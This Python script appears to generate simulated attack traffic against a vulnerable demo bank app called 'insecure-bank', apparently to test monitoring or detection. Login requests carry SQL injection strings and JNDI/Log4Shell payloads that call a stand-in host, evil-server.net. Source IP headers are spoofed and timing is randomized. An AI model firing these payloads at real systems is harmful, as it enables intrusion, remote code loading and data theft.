import argparse
import random
import requests
import time

from datetime import datetime
import pytz

parser = argparse.ArgumentParser()
parser.add_argument('--endpoint', dest='endpoint', default='http://insecure-bank:8080', required=False, help='endpoint to send requests to')
parser.add_argument('--utc_start_hour', dest='utc_start_hour', default=22, required=False, help='UTC hour to start sending requests')
parser.add_argument('--utc_end_hour', dest='utc_end_hour', default=7, required=False, help='UTC hour to stop sending requests')
args = parser.parse_args()

url = args.endpoint + '/insecure-bank/login'
payloads = (
                # SQL Injection
                'hacker\' OR 1=1 --',
                '" OR 1 = 1 -- -',
                '1\' ORDER BY 3--+',
                '-1 UNION SELECT 1 INTO @,@,@',
                'admin\') or (\'1\'=\'1',
                '\' or true--',

                # JNDI Injection
                '${jndi:ldap://evil-server.net:6666/InstallBackdoor}',
                '${jndi:ldap://evil-server.net:7777/ExtractDataPayload}',
                '${jndi:ldap://evil-server.net:999/CompromiseMachine}',
                '${jndi:ldap://evil-server.net:3333/ExploitVulnerability}',
                '${jndi:ldap://evil-server.net:9999/GatherSensitiveData}',
                '${jndi:ldap://evil-server.net:1111/MineBitcoin}',
                '${jndi:ldap://evil-server.net:6969/InstallMalware}'
           )
ips = (
        '66.42.128.45',     # USA
        '102.177.126.45',   # South Africa
        '130.208.160.146',  # Iceland
        '103.4.96.236',     # Singapore
        '130.244.70.120',   # Sweden
        '104.132.226.34',   # Switzerland
        '185.162.120.208',  # Monaco
        '128.140.152.0',    # Greece
        '104.28.15.3',      # Ireland
        '146.23.226.0',     # Kazachstan
        '35.156.178.215',   # Germany
        '109.235.248.0',    # Turkey
        '46.23.240.44',     # France
        '179.61.112.12',    # Colombia
        '207.204.64.23',    # Jamaica
        '89.248.144.127',   # Liechtenstein
        '24.92.144.13',     # Saint Lucia
        '186.26.128.135',   # Venezuela
        '85.237.224.198',   # Slovakia
        '154.126.224.4',    # Tanzania

        '2001:cdb8:1234:5678:90ab:ff00:ef42:8329'
      )

def is_between(hour, start_hour, end_hour):
    if start_hour < end_hour:
        return start_hour <= hour < end_hour
    else:
        return hour >= start_hour or hour < end_hour

while True:
    # check that no attacks are created that are not in UTC time range
    utc_hour = datetime.now(pytz.utc).hour
    if is_between(utc_hour, int(args.utc_start_hour), int(args.utc_end_hour)):
        # randomly select an IP for one specific attacker
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0',
            'X-Client-Ip': ips[random.randrange(0, len(ips))]
        }

        # select random number of requests from this specific attacker
        for request_count in range(random.randrange(2, 10)):
            try:
                params = {
                    'username': payloads[random.randrange(0, len(payloads))]
                }
                x = requests.post(url, data=params, headers=headers)

                print('URL        : ' + url)
                print('Payload    : ' + params['username'])
                print('IP Address : ' + headers['X-Client-Ip'])
                print('Status Code: ' + str(x.status_code))
                print()
            except:
                print('error trying to send request to: ' + url)

            wait_time = random.randrange(5, 20)
            print('waiting for ' + str(wait_time) + ' seconds until next attack ...')
            time.sleep(wait_time)

    # wait for next attacker
    wait_time = random.randrange(180, 600)
    print('waiting for ' + str(wait_time) + ' seconds until next attacker ...')
    time.sleep(wait_time)
